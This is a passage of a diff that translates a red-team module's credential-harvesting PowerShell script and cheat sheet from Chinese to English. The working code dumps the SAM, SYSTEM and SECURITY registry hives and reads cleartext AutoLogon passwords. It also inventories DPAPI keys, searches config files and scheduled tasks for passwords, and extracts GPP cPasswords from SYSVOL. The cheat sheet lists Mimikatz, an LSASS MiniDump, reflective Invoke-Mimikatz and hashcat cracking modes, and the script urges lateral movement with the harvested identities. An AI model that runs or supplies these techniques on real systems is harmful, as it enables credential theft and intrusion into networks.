     & reg.exe save HKLM\SAM "$WorkDir\sam.hive" /y *> $null
     & reg.exe save HKLM\SYSTEM "$WorkDir\sys.hive" /y *> $null
     if ((Test-Path "$WorkDir\sam.hive")) {
-        Write-Output "[+] sam.hive/sys.hive 已保存。离线：secretsdump -sam sam.hive -system sys.hive LOCAL（或 mimikatz lsadump::sam /system:sys.hive）"
-    } else { Write-Output "[-] reg save 失败（需 SYSTEM + SeBackupPrivilege）" }
-} else { Write-Output "[-] 当前非 SYSTEM，跳过。提权到 SYSTEM 后重跑本段（PsExec -s / 计划任务 / M06）" }
+        Write-Output "[+] sam.hive/sys.hive saved. Offline: secretsdump -sam sam.hive -system sys.hive LOCAL (or mimikatz lsadump::sam /system:sys.hive)"
+    } else { Write-Output "[-] reg save failed (needs SYSTEM + SeBackupPrivilege)" }
+} else { Write-Output "[-] Not SYSTEM — skipped. Re-run this section after elevating to SYSTEM (PsExec -s / scheduled task / M06)" }
 
-Section "2. LSA Secrets — 需 SYSTEM（服务账户密码/DPAPI 机器密钥）"
+Section "2. LSA Secrets — needs SYSTEM (service account passwords / DPAPI machine keys)"
 if ($Sys) {
     & reg.exe save HKLM\SECURITY "$WorkDir\sec.hive" /y *> $null
     if ((Test-Path "$WorkDir\sec.hive")) {
-        Write-Output "[+] sec.hive 已保存。离线：secretsdump -security sec.hive -system sys.hive LOCAL（或 mimikatz lsadump::secrets /system:sys.hive）"
-    } else { Write-Output "[-] reg save 失败" }
-} else { Write-Output "[-] 非 SYSTEM 跳过（HKLM\SECURITY 管理员也不可读）" }
+        Write-Output "[+] sec.hive saved. Offline: secretsdump -security sec.hive -system sys.hive LOCAL (or mimikatz lsadump::secrets /system:sys.hive)"
+    } else { Write-Output "[-] reg save failed" }
+} else { Write-Output "[-] Not SYSTEM — skipped (HKLM\SECURITY is unreadable even as admin)" }
 
-Section "3. 注册表 AutoLogon/Winlogon（明文）— 读权限/管理员"
-Try-Run "Winlogon AutoLogon 值" {
+Section "3. Registry AutoLogon/Winlogon (cleartext) — read rights / admin"
+Try-Run "Winlogon AutoLogon values" {
     (& reg.exe query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AutoAdminLogon 2>$null)
     (& reg.exe query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName 2>$null)
     (& reg.exe query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName 2>$null)
     $dp = (& reg.exe query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword 2>$null)
-    if ($dp) { $dp } else { "DefaultPassword 未设置（或不可读）" }
+    if ($dp) { $dp } else { "DefaultPassword not set (or unreadable)" }
 }
-Try-Run "注册表残留密码键" {
+Try-Run "Leftover registry password keys" {
     $keys = 'HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon','HKLM\SYSTEM\CurrentControlSet\Control\Lsa'
     $found = foreach ($k in $keys) { (& reg.exe query $k /s 2>$null) | Select-String -Pattern 'Password|Secret' }
-    if ($found) { ($found | Select-Object -First 5).Line -join ' | ' } else { '未发现明显密码键' }
+    if ($found) { ($found | Select-Object -First 5).Line -join ' | ' } else { 'No obvious password keys found' }
 }
 
-Section "4. 缓存域登录 — 需 SYSTEM（DCC2 哈希）"
+Section "4. Cached domain logons — needs SYSTEM (DCC2 hashes)"
 if ($Sys) {
-    Try-Run "HKLM\SECURITY\Cache 条目" {
+    Try-Run "HKLM\SECURITY\Cache entries" {
         $n = (& reg.exe query "HKLM\SECURITY\Cache" 2>$null | Select-String -Pattern 'NL\$' ).Count
-        "缓存条目数≈$n（离线解析：mimikatz lsadump::cache /system:sys.hive，破解 hashcat -m 2100）"
+        "Cached entries ≈$n (offline: mimikatz lsadump::cache /system:sys.hive; crack with hashcat -m 2100)"
     }
-} else { Write-Output "[-] 非 SYSTEM 跳过" }
+} else { Write-Output "[-] Not SYSTEM — skipped" }
 
-Section "5. DPAPI（主密钥/凭据文件）— 需对应用户会话"
-Try-Run "当前用户 DPAPI" {
+Section "5. DPAPI (master keys / credential files) — needs matching user session"
+Try-Run "Current-user DPAPI" {
     $u = $env:USERPROFILE
     $roam = "$u\AppData\Roaming\Microsoft\Protect"; $loc = "$u\AppData\Local\Microsoft\Protect"
     $cred = "$u\AppData\Local\Microsoft\Credentials"; $vault = "$u\AppData\Local\Microsoft\Vault"
     $r = @()
-    if (Test-Path $roam) { $r += "Roaming主密钥x$((Get-ChildItem $roam -Recurse -File -EA SilentlyContinue).Count)" }
-    if (Test-Path $loc)  { $r += "Local主密钥x$((Get-ChildItem $loc -Recurse -File -EA SilentlyContinue).Count)" }
-    if (Test-Path $cred) { $r += "Credentials文件x$((Get-ChildItem $cred -Recurse -File -EA SilentlyContinue).Count)" }
-    if (Test-Path $vault) { $r += "Vault目录存在" }
-    if ($r) { $r -join ' | ' } else { '无（或当前用户无 DPAPI 材料）' }
+    if (Test-Path $roam) { $r += "Roaming master keys x$((Get-ChildItem $roam -Recurse -File -EA SilentlyContinue).Count)" }
+    if (Test-Path $loc)  { $r += "Local master keys x$((Get-ChildItem $loc -Recurse -File -EA SilentlyContinue).Count)" }
+    if (Test-Path $cred) { $r += "Credentials files x$((Get-ChildItem $cred -Recurse -File -EA SilentlyContinue).Count)" }
+    if (Test-Path $vault) { $r += "Vault directory present" }
+    if ($r) { $r -join ' | ' } else { 'None (or current user has no DPAPI material)' }
 }
-Try-Run "其他用户目录（仅盘点，解密需对应用户）" {
+Try-Run "Other user profiles (inventory only; decrypt needs that user)" {
     (Get-ChildItem C:\Users -Directory -EA SilentlyContinue | Where-Object { $_.Name -notin @('Public','Default','Default User','All Users') } | Select-Object -ExpandProperty Name) -join ', '
 }
 
-Section "6. 配置文件残留密码 — 读权限即可"
+Section "6. Config-file leftover passwords — read rights enough"
 if (-not $SkipConfigScan) {
     $dirs = 'C:\Windows\Panther','C:\Windows\System32\sysprep','C:\inetpub','C:\ProgramData','C:\Users\Public'
     $files = Get-ChildItem $dirs -Recurse -Include unattend*.xml,*.config,*.ps1,*.bat,*.cmd,*.vbs,*.xml,*.txt -File -EA SilentlyContinue |
              Where-Object { $_.Length -lt 2MB } | Select-Object -First 400
     $hits = $files | Select-String -Pattern 'password\s*[=:]\s*\S+|passwd\s*[=:]\s*\S+|<Password>|<Value>|pwd\s*=' -EA SilentlyContinue | Select-Object -First 15
     if ($hits) { ($hits | ForEach-Object { "{0}:{1}" -f $_.Path, $_.Line.Trim() }) -join "`n" }
-    else { '未发现（可人工扩大目录：含 web.config 的站点目录、用户家目录脚本）' }
-} else { Write-Output '[-] 已按 -SkipConfigScan 跳过' }
+    else { 'None found (manually widen dirs: site folders with web.config, user-home scripts)' }
+} else { Write-Output '[-] Skipped per -SkipConfigScan' }
 
-Section "7. 计划任务动作里的脚本/凭据 — 管理员"
-Try-Run "任务动作引用的脚本" {
+Section "7. Scripts/creds in scheduled-task actions — admin"
+Try-Run "Scripts referenced by task actions" {
     $csv = (& schtasks.exe /query /fo csv /v 2>$null) | ConvertFrom-Csv
     $scripts = $csv | Where-Object { $_.'Task To Run' -match '\.(bat|cmd|ps1|vbs|js|exe) ' -and $_.'Task To Run' -notmatch '\\Windows\\' } |
                Select-Object -First 8
     if ($scripts) { ($scripts | ForEach-Object { "{0} -> {1} (RunAs:{2})" -f $_.TaskName, $_.'Task To Run', $_.'Run As User' }) -join "`n" }
-    else { '无非系统脚本类任务动作（仍建议抽查 TaskCache 注册表）' }
+    else { 'No non-system script-like task actions (still worth spot-checking TaskCache registry)' }
 }
 
-Section "8. GPP（SYSVOL 组策略首选项）— 域身份+读 SYSVOL"
+Section "8. GPP (SYSVOL Group Policy Preferences) — domain identity + read SYSVOL"
 if ($Domain -ne '') {
     $pol = "\\$Domain\SYSVOL\$Domain\Policies"
     if (Test-Path $pol) {
@@ -394,29 +390,29 @@ if ($Domain -ne '') {
             $m = [regex]::Matches((Get-Content -Raw $f.FullName), 'userName="([^"]+)"[^>]*?cPassword="([^"]+)"')
             if ($m.Count) { Write-Output ("[+] {0}: {1}" -f $f.FullName, (($m | ForEach-Object { "$($_.Groups[1].Value):$($_.Groups[2].Value)" }) -join ', ')) }
         }
-        Write-Output "[*] 上列 cPassword 用 gpp-decrypt 离线解；也顺带扫 SYSVOL 下其他 .xml/.ini 残留"
-    } else { Write-Output "[-] SYSVOL 不可达（$pol）。检查：本机是否加域、当前身份是否有域权限、DNS 是否正确" }
-} else { Write-Output "[-] 未给 -Domain，跳过 GPP；加域机器建议补跑" }
+        Write-Output "[*] Decrypt listed cPassword offline with gpp-decrypt; also scan other .xml/.ini leftovers under SYSVOL"
+    } else { Write-Output "[-] SYSVOL unreachable ($pol). Check: domain-joined host, current identity has domain rights, DNS is correct" }
+} else { Write-Output "[-] No -Domain given; GPP skipped. Domain-joined hosts should re-run with it" }
 
-Section "完成：产物与下一步"
-Write-Output "[*] 产物目录 $WorkDir 内 hive 文件列表："
+Section "Done: artifacts and next steps"
+Write-Output "[*] Hive files under $WorkDir:"
 Get-ChildItem $WorkDir -File | ForEach-Object { "    $($_.Name) ($($_.Length) bytes)" }
-Write-Output "[*] 优先级：SYSTEM 环境先解析 SAM/LSA Secrets（常含可直接过横向的身份）；无 SYSTEM 时先查配置文件/计划任务/GPP（读权限即可）"
-Write-Output "[*] 解析出的身份用 M15（WinRM 明文/哈希）或 M12（PTT/委派）实际认证一次来验证，勿停留在哈希值本身"
+Write-Output "[*] Priority: under SYSTEM, parse SAM/LSA Secrets first (often identities usable for lateral); without SYSTEM, check config/scheduled tasks/GPP first (read rights enough)"
+Write-Output "[*] Authenticate once for real with parsed identities via M15 (WinRM cleartext/hash) or M12 (PTT/delegation) — do not stop at the hash string itself"
 ````
 
-## cheat sheet 关键词对照（速记）
+## Cheat sheet keyword map (quick reference)
 
-| 关键词 | 本模块落点 |
+| Keyword | Where it lands in this module |
 |---|---|
-| `Mimikatz` | 无 PPL 时的内存执行/离线 minidump 解析（第 1 步） |
-| `LSA Protection Bypass` | 只评估不假定：`RunAsPPL` 判型，PPL 开启默认走替代来源 |
-| `MiniDump` | `rundll32 comsvcs.dll,MiniDump` / procdump + attacker box离线解析 |
-| `Invoke-Mimikatz` | 反射加载形态脚本 `m07-invoke-mimikatz-reflect.ps1` |
-| `Cracking Hashes` | `hashcat -m 1000/2100/5600`（NTLM / DCC2 / NetNTLMv2） |
+| `Mimikatz` | In-memory / offline minidump parse when no PPL (step 1) |
+| `LSA Protection Bypass` | Evaluate only, do not assume: classify via `RunAsPPL`; if PPL on, default to alternate sources |
+| `MiniDump` | `rundll32 comsvcs.dll,MiniDump` / procdump + offline parse on attacker box |
+| `Invoke-Mimikatz` | Reflective load script `m07-invoke-mimikatz-reflect.ps1` |
+| `Cracking Hashes` | `hashcat -m 1000/2100/5600` (NTLM / DCC2 / NetNTLMv2) |
 
-## 相关模块
+## Related modules
 
-- 拿到身份后横向：M15（WinRM 明文/哈希）、M12（票据 / over-pass-the-hash / 委派）。
-- 本地权限不足时先提权：M06；行为检测对抗思路：M05 场景 19。
-- 哈希中继与抓取场景（非本场景主路）：M16 / M11（responder、SQL 触发认证）。
+- After identity: lateral M15 (WinRM cleartext/hash), M12 (tickets / over-pass-the-hash / delegation).
+- If local rights are insufficient: elevate first via M06; behavioral detection ideas: M05 scenario 19.
+- Hash relay / capture scenarios (not the main path here): M16 / M11 (responder, SQL-triggered auth).
